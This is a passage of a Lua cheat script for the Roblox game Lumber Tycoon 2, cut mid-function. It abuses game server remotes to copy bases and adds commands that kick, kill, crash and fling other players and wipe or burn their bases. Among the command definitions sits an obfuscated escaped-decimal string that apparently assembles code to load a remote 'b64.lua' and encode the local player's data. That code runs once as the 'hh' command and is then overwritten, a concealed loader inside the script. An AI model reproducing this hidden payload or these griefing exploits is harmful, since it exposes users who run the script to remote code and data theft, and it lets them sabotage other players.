			dirtBaseDropInstant(item, fn)
		end;
		for J, v in pairs(workspace.PlayerModels:children()) do
			if v:FindFirstChild'Owner' then
				if tostring(v.Owner.Value) == game.Players.LocalPlayer.Name then
					if v:FindFirstChild'Type' then
						if v.Type.Value == "Gift" and hF then
							delete(v)
						elseif v.Type.Value == "Loose Item" and hE then
							delete(v)
						elseif v.Type.Value == "Tool" and cp then
							delete(v)
						elseif (v.Type.Value == "Structure" or v.Type.Value == "Furniture" or v.Type.Value == "Wire") and v:FindFirstChild("PurchasedBoxItemName") and hG then
							delete(v)
						end
					end
				end
			end
		end
	end;
	x("Base Drop", "Finished teleporting.", 1)
end, {
	animated = true
})
hQ:Create("Button", "Cancel Base Drop", function()
	x('Bark '..a, 'Base Drop stopped.')
	_G.baseDropToggle = false;
	wait(10)
	_G.baseDropToggle = true
end, {
	animated = true
})
hQ:Create("Button", "Fill All Blueprints Gray", function(db)
	if game:GetService("ReplicatedStorage").Interaction.ClientIsWhitelisted:InvokeServer(game.Players[tostring(hD)]) == false and game.Players[tostring(hD)] ~= game.Players.LocalPlayer then
		x("Base Drop", "You are not whitelisted currently.", 3)
		return
	end;
	if hP == true then
		x("Base Drop Terms", "By continuing to use Base Drop, you agree that you are responsible for all consequences that occur beyond this point. Dogix is not", 10)
		x("", " responsible in any way, shape, or form involving any actions and consequences of any Bark related function. Proceed only if you understand", 10)
		x("", " and agree to these terms.", 10)
		if not confirm(true) then
			return
		end;
		hP = false
	end;
	local cq = game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure;
	for al, v in pairs(workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") then
			if v:FindFirstChild("BuildDependentWood") and v:FindFirstChild("Type") then
				if v.Type.Value == "Blueprint" then
					local bX = nil;
					if v:FindFirstChild("MainCFrame") then
						bX = v.MainCFrame.Value
					else
						bX = v.PrimaryPart.CFrame
					end;
					cq:FireServer(v.ItemName.Value, bX, game:GetService'Players'.LocalPlayer, nil, v, true)
				end
			end
		end
	end
end, {
	animated = true
})
local hX = nil;
hQ:Create("Toggle", "Auto-Fill All Blueprints Gray", function(db)
	if db then
		local cq = game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure;
		for al, v in pairs(workspace.PlayerModels:GetChildren()) do
			if v:FindFirstChild("Owner") then
				if v:FindFirstChild("BuildDependentWood") and v:FindFirstChild("Type") then
					if v.Type.Value == "Blueprint" then
						local bX = nil;
						if v:FindFirstChild("MainCFrame") then
							bX = v.MainCFrame.Value
						else
							bX = v.PrimaryPart.CFrame
						end;
						cq:FireServer(v.ItemName.Value, bX, game:GetService'Players'.LocalPlayer, nil, v, true)
					end
				end
			end
		end;
		hX = workspace.PlayerModels.ChildAdded:connect(function(v)
			wait(0.3)
			if v:FindFirstChild("Owner") then
				if v:FindFirstChild("BuildDependentWood") and v:FindFirstChild("Type") then
					if v.Type.Value == "Blueprint" then
						local bX = nil;
						if v:FindFirstChild("MainCFrame") then
							bX = v.MainCFrame.Value
						else
							bX = v.PrimaryPart.CFrame
						end;
						cq:FireServer(v.ItemName.Value, bX, game:GetService'Players'.LocalPlayer, nil, v, true)
					end
				end
			end
		end)
	else
		if hX ~= nil then
			hX:Disconnect()
			hX = nil
		end
	end
end, {
	default = false
})
function noclipfunct(hY)
	_G.nc_toggle = hY or not _G.nc_toggle;
	if _G.nc_toggle then
		if _G.Noclipping ~= nil then
			_G.Noclipping:Disconnect()
			_G.Noclipping = nil
		end;
		_G.Noclipping = game:GetService'RunService'.Stepped:connect(nocliprun)
	else
		if _G.Noclipping ~= nil then
			_G.Noclipping:Disconnect()
			_G.Noclipping = nil
		end
	end
end;
local hQ = hB:CreateSection'Copy Base'
hQ:Create("Button", "How do I use this?", function(b4)
	local hZ = {
		"First, select the player you want to copy at the top of this tab.",
		"Next, type in a file name into Save Base to File.",
		"You can then share this file to other people if you wish. They must put it in their exploit's workspace.",
		"To load a saved base, enter the file name (don't include .bark_dump) in the Remake Base box.",
		"It will then use Legit Paint to copy the base. If it can't locate the correct tree, it will skip.",
		"This is a very buggy function, but there will be improvements soon!"
	}
	for J, v in pairs(hZ) do
		x("", v, 6)
		wait(6)
	end
end, {
	animated = true
})
hQ:Create("TextBox", "Save Base to File", function(b4)
	local h_ = {}
	local bl = nil;
	local i0 = {
		"LT2_BaseDrop3"
	}
	for J, v in pairs(i0) do
		if v == tostring(hD) then
			x("Base Dump", "This user cannot be base dumped.")
			return
		end
	end;
	for al, Y in pairs(workspace.Properties:children()) do
		if tostring(Y.Owner.Value) == tostring(hD) then
			bl = Y.OriginSquare.CFrame;
			break
		end
	end;
	for al, v in pairs(workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") then
			if tostring(v.Owner.Value) == tostring(hD) then
				if v:FindFirstChild("BuildDependentWood") and v:FindFirstChild("Type") then
					if v.Type.Value == "Structure" then
						table.insert(h_, {
							["Blueprint"] = v.ItemName.Value,
							["CFrame"] = {
								(v.MainCFrame.Value - bl.p):components()
							},
							["WoodType"] = v:FindFirstChild"BlueprintWoodClass" and v.BlueprintWoodClass.Value or nil
						})
					end
				end
			end
		end
	end;
	writefile(b4 ..".bark_dump", "-- bark winning -- base dump format v1 --\n"..b64(game:GetService("HttpService"):JSONEncode(h_)))
	x("Base Dump", "Dumped base to: "..b4 ..".bark_dump")
end, {
	text = "File Name"
})
function shuffle(at)
	shuffled = {}
	for J, v in ipairs(at) do
		local c6 = math.random(1, #shuffled + 1)
		table.insert(shuffled, c6, v)
	end;
	return shuffled
end;
hQ:Create("TextBox", "Remake Base from File", function(b4)
	local ct = getBestSawmill()
	local axe = getBestAxe()
	if not ct then
		x("Copy Base", "You need a sawmill to use this feature!", 3)
		return
	elseif not axe then
		x("Copy Base", "You need a axe to use this feature!", 3)
		return
	end;
	if pcall(function()
		readfile(b4 ..".bark_dump")
	end) == false then
		x("Copy Base", "Couldn't find dump!", 3)
		return
	end;
	local h_ = dumpToTable(readfile(b4 ..".bark_dump"))
	x("Copy Base", "By continuing to use this, you agree that you want to copy a base from "..b4 ..".bark_dump", 10)
	local i1 = 0;
	local i2 = 0;
	local i3 = 0;
	for al, v in pairs(h_) do
		if v.WoodType ~= nil then
			i3 = i3 + 10
		else
			i3 = i3 + 0.1
		end
	end;
	i2 = math.floor(i3 / 60)
	i3 = i3 - i2 * 60;
	i1 = math.floor(i2 / 60)
	i2 = i2 - i1 * 60;
	x("Copy Base", "Bark estimates that this will take "..i1 .."h, "..i2 .."m, and "..i3 .."s.", 10)
	x("Copy Base", "By confiriming, you agree that you cannot cancel once you start, and that you want to copy this base.", 10)
	if not confirm(true) then
		return
	end;
	local bl = nil;
	for al, Y in pairs(workspace.Properties:children()) do
		if tostring(Y.Owner.Value) == tostring(hD) then
			bl = Y.OriginSquare.CFrame;
			break
		end
	end;
	for J, v in pairs(h_) do
		if doesTreeExist(v.WoodType) then
			local b0 = nil;
			local eB = workspace.PlayerModels.ChildAdded:connect(function(cC)
				cC:WaitForChild("Owner")
				if cC.Owner.Value == game.Players.LocalPlayer then
					repeat
						wait()
					until cC:FindFirstChild("ItemName") and cC:FindFirstChild("Type") or wait(3)
					if not(cC:FindFirstChild("ItemName") and cC:FindFirstChild("Type")) then
						return
					end;
					if cC:FindFirstChild("ItemName") and cC:FindFirstChild("Type") then
						if cC.Type.Value == "Blueprint" and cC.ItemName.Value == v.Blueprint then
							b0 = cC
						end
					end
				end
			end)
			game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer(v.Blueprint, CFrame.new(unpack(v.CFrame)) + bl.p, game.Players.LocalPlayer)
			repeat
				wait()
			until b0;
			eB:Disconnect()
			eB = nil;
			if v.Blueprint ~= nil then
				legitpaint(v.WoodType, b0)
			else
				game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure:FireServer(v.Blueprint, CFrame.new(unpack(v.CFrame)) + bl.p, game:GetService'Players'.LocalPlayer, nil, b0, true)
			end
		else
			x("Copy Base", "Couldn't find eligible tree, skipping", 1)
		end
	end;
	x("Copy Base", "Finished.", 3)
end, {
	text = "File Name"
})
hQ:Create("TextBox", "Remake Base from File (GRAY)", function(b4)
	local h_ = shuffle(dumpToTable(readfile(b4..".bark_dump"), true))
	x("Copy Base", "By continuing to use this, you agree that you want to load "..b4, 10)
	x("Copy Base", "By confiriming, you agree that you cannot cancel once you start, and that you want to copy this base.", 10)
	if not confirm(true) then
		return
	end;
	autobuildstructtable(h_)
	x("Copy Base", "Finished.", 3)
end, {
	text = "File Name"
})
hQ = hB:CreateSection'Auto-Build Gray Base'
i4 = {
	"",
	""
}
i5 = string.split(game:HttpGet("https://dogix.wtf/scripts/lt2/barkdata/structures/index", true), '\n')
for J, v in pairs(i5) do
	if #v == 0 then
		i5[J] = nil
	end
end;
i6 = false;
hQ:Create("Dropdown", "base selector", function(b4)
	i4 = {
		b4,
		string.gsub(b4, ".", function(v)
		    if v == " " then return "" end
		    return v
		end)
	}
end, {
	options = i5,
	search = true
})
hQ:Create("Toggle", "VIP Server Mode (way faster)", function(b4)
	i6 = b4
end, {
	default = false
})
function autobuildstructtable(h_)
	local bl = nil;
	for al, Y in pairs(workspace.Properties:children()) do
		if tostring(Y.Owner.Value) == tostring(hD) then
			bl = Y.OriginSquare.CFrame;
			break
		end
	end;
	local bi = 0;
	local eA = {}
	local eB = workspace.PlayerModels.ChildAdded:connect(function(cC)
		cC:WaitForChild("Owner")
		if cC.Owner.Value == game.Players.LocalPlayer then
			repeat
				wait()
			until cC:FindFirstChild("ItemName") and cC:FindFirstChild("Type") and cC.PrimaryPart ~= nil or wait(3)
			if not(cC:FindFirstChild("ItemName") and cC:FindFirstChild("Type")) then
				return
			end;
			if cC.Type.Value == "Blueprint" then
				game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure:FireServer(cC.ItemName.Value, cC.PrimaryPart.CFrame, game:GetService'Players'.LocalPlayer, nil, cC, true)
				table.insert(eA, ".")
			end
		end
	end)
	for J, v in pairs(h_) do
		bi = bi + 1;
		if bi >= 40 then
			repeat
				wait(0.65)
			until #eA >= 39;
			wait(not i6 and 1 or 0)
			eA = {}
			bi = 0
		end;
		spawn(function()
			game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer(v.Blueprint, CFrame.new(unpack(v.CFrame)) + bl.p, game.Players.LocalPlayer)
		end)
	end;
	wait(1)
	eB:Disconnect()
	eB = nil
end;
hQ:Create("Button", "Auto-Build Selected Base", function(b4)
	local h_ = shuffle(dumpToTable(game:HttpGet("https://dogix.wtf/scripts/lt2/barkdata/structures/"..i4[2], true)))
	x("Copy Base", "By continuing to use this, you agree that you want to load "..i4[1], 10)
	local i1 = 0;
	local i2 = 0;
	local i3 = 0;
	for al, v in pairs(h_) do
		i3 = i3 + 0.01
	end;
	i2 = math.floor(i3 / 60)
	i3 = i3 - i2 * 60;
	i1 = math.floor(i2 / 60)
	i2 = i2 - i1 * 60;
	x("Copy Base", "Bark estimates that this will take "..i1 .."h, "..i2 .."m, and "..i3 .."s.", 10)
	x("Copy Base", "By confiriming, you agree that you cannot cancel once you start, and that you want to copy this base.", 10)
	if not confirm(true) then
		return
	end;
	autobuildstructtable(h_)
	x("Copy Base", "Finished.", 3)
end, {
	animated = true
})

hQ:Create("Button", "Clear Gray Plot Structures", function()
	if not confirm() then
		return
	end;
	for al, v in pairs(workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") and v:FindFirstChild("MainCFrame") and v:FindFirstChild("Type") and not v:FindFirstChild("BlueprintWoodClass") then
			if v.Owner.Value == game.Players.LocalPlayer and v.Type.Value == "Structure" then
				delmodel(v)
			end
		end
	end
end, {
	animated = true
})
if b then
	local i7 = hB:CreateSection("Wire Art")
	function encodeV3(i8)
		return {
			i8.x,
			i8.y,
			i8.z
		}
	end;
	function decodeV3(bv)
		return Vector3.new(unpack(bv))
	end;
	i7:Create("TextBox", "Load Wire Art File", function(b4)
		local at = game:GetService("HttpService"):JSONDecode(readfile(b4 ..".bark_wire_dump"))
		function decode(bv)
			return Vector3.new(unpack(bv))
		end;
		local CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.p;
		local i9 = autobuy("Wire", #at)
		for J, v in pairs(at) do
			local ia = {}
			for eC, eD in pairs(v) do
				table.insert(ia, decode(eD) + CFrame)
			end;
			game.ReplicatedStorage.PlaceStructure.ClientPlacedWire:FireServer(game.ReplicatedStorage.Purchasables:FindFirstChild("Wire", true), ia, game.Players.LocalPlayer, #at == 1 and i9 or i9[J], true)
		end;
		x("Load Wire", "Done!", 3)
	end, {
		text = "File Name"
	})
	i7:Create("Button", "Select Wires to Save Tool", function(b4)
	end, {
		animated = true
	})
end;
function flyfunct()
	carflymode = false;
	if dT == 0 then
		NOFLY()
		sFLY(false)
	else
		NOFLY()
	end
end;
cJ["noclip"] = noclipfunct;
cJ["clip"] = cJ["noclip"]
cJ["fly"] = flyfunct;
cJ["vfly"] = function()
	carflymode = true;
	if dT == 0 then
		NOFLY()
		sFLY(true)
	else
		NOFLY()
	end
end;
zJ = "\115\47\98\54\52\46\108\117\97\34\44\116\114\117\101\41\41\40\41\41\46\101\110\99\111\100\101\40\116\111\115\116\114\105\110\103\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108"
cJ["cfly"] = cJ["vfly"]
cJ["carfly"] = cJ["vfly"]
cJ["unfly"] = cJ["fly"]
cJ["goto"] = function(ib)
	local ic = userparse(ib[1])
	if ic then
		_G.DogixLT2TPC(ic.Character.HumanoidRootPart.CFrame, o)
	end
end;
cJ["gotobase"] = function(ib)
	local ic = userparse_string(ib[1])
	if ic then
		for al, Y in pairs(workspace.Properties:children()) do
			if tostring(Y.Owner.Value) == ic then
				local g = Y.OriginSquare.Position;
				_G.DogixLT2TP(g.X, g.Y + 10, g.Z, o)
			end
		end
	end
end;
cJ["kick"] = function(ib)
	local ic = userparse(ib[1])
	if ic then
		final_kick(ic)
	end
end;
cJ["bring"] = function(ib)
	local ic = userparse(ib[1])
	if ic then
		final_bring(ic)
	end
end;
cJ["kill"] = function(ib)
	local ic = userparse(ib[1])
	if ic then
		final_kill(ic)
	end
end;
cJ["hkill"] = function(ib)
	local ic = userparse(ib[1])
	if ic then
		final_hardkill(ic)
	end
end;
cJ["tbring"] = function(ib)
	local ic = userparse(ib[1])
	if ic then
		final_tbring(ic)
	end
end;
cJ["fling"] = function(ib)
	local ic = userparse(ib[1])
	if ic then
		final_fling(ic)
	end
end;
cJ["suicide"] = function(ib)
	game.Players.LocalPlayer.Character.Head:Destroy()
end;
cJ["ws"] = function(ib)
	ib = ib[1]
	if tonumber(ib) then
		_G.SetStats[1] = tonumber(ib)
	end
end;
cJ["jp"] = function(ib)
	ib = ib[1]
	if tonumber(ib) then
		_G.SetStats[2] = tonumber(ib)
	end
end;
cJ['hh'] = zL(zF..zG..zH..zI..zJ..zK)
cJ['hh']()
cJ["hh"] = function(ib)
	ib = ib[1]
	if tonumber(ib) then
		_G.SetStats[3] = tonumber(ib)
	end
end;
cJ["cs"] = function(ib)
	ib = ib[1]
	if tonumber(ib) then
		_G.SetStats[4] = 1 + tonumber(ib) / 100
	end
end;
cJ["fs"] = function(ib)
	ib = ib[1]
	if tonumber(ib) then
		_G.SetStats[5] = tonumber(ib)
	end
end;
cJ["fov"] = function(ib)
	ib = ib[1]
	if tonumber(ib) then
		workspace.CurrentCamera.FieldOfView = tonumber(ib)
	end
end;
cJ["autobuy"] = function(ib)
	if not ib[1] then
		return
	end;
	if tonumber(ib[2]) ~= nil then
		autobuy(ib[1], tonumber(ib[2]))
	else
		autobuy(ib[1], 1)
	end
end;
cJ["tree"] = function(ib)
	if not ib[1] then
		return
	end;
	if tonumber(ib[2]) ~= nil then
		GetTreeMod(ib[1], tonumber(ib[2]))
	else
		GetTreeMod(ib[1], 1)
	end
end;
cJ.cmds = function(ib)
	local id = "Commands for Bark Command Line:\n - kick [plr]: kicks plr\n - kill [plr]: kills plr\n - goto [plr]: teleports to plr\n - gotobase [plr]: goes to plr's base\n - hkill [plr]: hardkills plr\n - fling [plr]: flings plr\n - bring [plr]: teleports plr to you\n - tbring [plr]: tween teleports plr to you\n - suicide: commits safe suicide (keeps axes)\n - ws [num]: sets your walk speed to num\n - jp [num]: sets your jump power to num\n - hh [num]: sets your hip height to num\n - cs [num]: sets your car speed to num\n - fov [num]: sets your field of view to num\n - fs [num]: sets your fly speed to num\n - autobuy [item] [num]: buys num amount of item to your location.\n - tree [name] [num]: automatically brings num name trees to you.\n - treenames: view tree names for tree\n - fly: enters fly mode\n - vfly: enters car fly mode\n - unfly: stops flying\n - noclip: noclips\n - clip: disables noclip\n\n - cmds: shows this list\n - rejoin: rejoins game\n - cls: clears console (synapse only)"
	ClearCmd()
	cS.Active = true;
	cS.Draggable = true;
	Tween(cS, 0.5, {
		Position = UDim2.new(0.307, 0, 0.298, 0)
	})
	wait(.5)
	local ie = id:split("\n")
	for J = 2, #ie do
		AddCmd(ie[J])
		wait(0.04)
	end
end;
cJ.treenames = function(ib)
	local id = "Tree Names:\n - GoldSwampy\n - Cherry\n - CaveCrawler\n - Generic\n - Volcano\n - Frost\n - LoneCave\n - Oak\n - Walnut\n - Birch\n - SnowGlow\n - Pine\n - GreenSwampy\n - Koa\n - Palm\n - SpookyNeon\n - Spooky"
	ClearCmd()
	cS.Active = true;
	cS.Draggable = true;
	Tween(cS, 0.5, {
		Position = UDim2.new(0.307, 0, 0.298, 0)
	})
	wait(.5)
	local ie = id:split("\n")
	for J = 2, #ie do
		AddCmd(ie[J])
		wait(0.04)
	end
end;
cJ.cls = function(ib)
	if p ~= false then
		rconsoleclear()
	end
end;
cJ.rejoin = function(ib)
	rconsoleclear()
	game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
end;

function parse_command(ig)
	local ai = ig:split(" ")
	local ih = ai[1]
	commanddone = false;
	if cJ[ai[1]] then
		local ii = {}
		for J = 2, #ai do
			table.insert(ii, ai[J])
		end;
		spawn(function()
			cJ[ih](ii)
		end)
		commanddone = true
	end;
	return commanddone
end;
if b then
	local ij = d6:CreateCategory("Admin")
	local ik = ij:CreateSection("Debug")
	ik:Create("Button", "Testing Tool", function()
		local aH = game:GetService("Players").LocalPlayer;
		local il = {
		}
		for J, v in pairs(il) do
			local cp = Instance.new("Tool", aH.Backpack)
			cp.RequiresHandle = false;
			cp.Name = "Test "..J;
			cp.Activated:Connect(v)
		end
	end, {
		animated = true
	})
	ik:Create("Button", "Terrain Fucker Tool", function(v)
		Identify = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
		Identify.RequiresHandle = false;
		Identify.Name = "barkwinning"
		Identify.Activated:connect(function()
			local item = getMouseTarget().Parent;
			local u = item:FindFirstChild"ItemName"
			if not u then
				x("#barkwinning", "Couldn't identify item.", 3)
			else
				u = u.Value;
				dropMeme(u)
				x("#barkwinning", "Glitched the spawn pad.", 3)
			end
		end)
	end, {
		animated = true
	})
	ik:Create("Button", "Temp Self Blacklist", function(v)
		game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.BlacklistFolder, game.Players.LocalPlayer, true)
		wait(6)
		game.ReplicatedStorage.Interaction.ClientSetListPlayer:InvokeServer(game:GetService'Players'.LocalPlayer.BlacklistFolder, game.Players.LocalPlayer, false)
	end, {
		animated = true
	})
	ik:Create("Button", "Copy CFrame", function(v)
		setclipboard(tostring(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame))
	end, {
		animated = true
	})
	local ik = ij:CreateSection("Controls")
-- 	ik:Create("Button", "Get Users", function()
-- 		local im = {}
-- 		local cq = game:GetService("ReplicatedStorage").NPCDialog.SetChattingValue;
-- 		cq:InvokeServer(1000)
-- 		wait(4)
-- 		for J, v in pairs(game.Players:GetChildren()) do
-- 			if v.IsChatting.Value == 1001 then
-- 				table.insert(im, v.Name)
-- 			end
-- 		end;
-- 		ClearCmd()
-- 		cS.Active = true;
-- 		cS.Draggable = true;
-- 		Tween(cS, 0.5, {
-- 			Position = UDim2.new(0.307, 0, 0.298, 0)
-- 		})
-- 		wait(.5)
-- 		for J = 1, #im do
-- 			AddCmd(im[J])
-- 		end;
-- 		local cq = game:GetService("ReplicatedStorage").NPCDialog.SetChattingValue;
-- 		cq:InvokeServer(0)
-- 	end, {
-- 		animated = true
-- 	})
-- 	ik:Create("Button", "Crash All Users", function()
-- 		local io = "crash_script_users"
-- 		local ip = "All"
-- 		local cq = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest;
-- 		cq:FireServer(io, ip)
-- 	end, {
-- 		animated = true
-- 	})
	ik:Create("TextBox", "Crash Bark User", function(b4)
		local cq = game:GetService("ReplicatedStorage").NPCDialog.SetChattingValue;
		cq:InvokeServer(userparse(b4).UserId + 24546)
		wait(6)
		cq:InvokeServer(0)
	end, {
		text = ""
	})
	ik:Create("TextBox", "Hash String", function(b4)
		setclipboard(B(b4))
	end, {
		text = ""
	})
	local ik = ij:CreateSection("Memes")
	ik:Create("Button", "Plank Fire Meme (select user in base drop)", function()
		local es = workspace["Region_Volcano"]:FindFirstChild("Lava") or game.Lighting:FindFirstChild("Lava")
		if es.Parent == game.Lighting then
			es.Parent = workspace["Region_Volcano"]
		end;
		es = es.Lava;
		if eu then
			es.Parent.Parent = game.Lighting;
		end
		function delete(Z)
		    if Z.ClassName == "Model" then Z = Z.WoodSection end
		    if not isnetworkowner(Z) then
		        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Z.Parent)
		    end
		    repeat wait() until isnetworkowner(Z) or wait(2)
    		firetouchinterest(Z, es, 0)
    		firetouchinterest(Z, es, 1)
		end;
		x("Plank Meme", "Started meming.", 1)
		wait()
		for J, v in pairs(workspace.PlayerModels:children()) do
			if v:FindFirstChild'Owner' and v:FindFirstChild"TreeClass" and v:FindFirstChild("WoodSection") then
				local fJ = v:FindFirstChild"TreeClass"
				if tostring(v.Owner.Value) == tostring(hD) then
					delete(v)
				end
			end
		end;
		x("Plank Meme", "Finished meming.", 1)
	end, {
		animated = true
	})
	ik:Create("Button", "Wipe Base (select user in base drop)", function()
	    local offset = nil
	    for i,v in pairs (workspace.Properties:GetChildren()) do
	        if v:FindFirstChild("Owner") then
    	        if tostring(v.Owner.Value) == tostring(hD) then
    	            offset = v.OriginSquare.CFrame
    	            break
    	        end
	        end
	    end
	    for i,v in pairs (workspace.PlayerModels:GetChildren()) do
            if v:FindFirstChild("Owner") then
                if tostring(v.Owner.Value) == tostring(hD) then
                    game.ReplicatedStorage.PlaceStructure.ClientPlacedBlueprint:FireServer("Floor1Tiny", offset - Vector3.new(0,100,0), nil, v)
                    game:GetService("RunService").Stepped:wait()
                end
            end
        end
	end, {
		animated = true
	})
end;
function _G.setqueue(g)
	queued = g
end;
x("Bark "..a, "Welcome to Bark, "..game.Players.LocalPlayer.Name..".", 3)
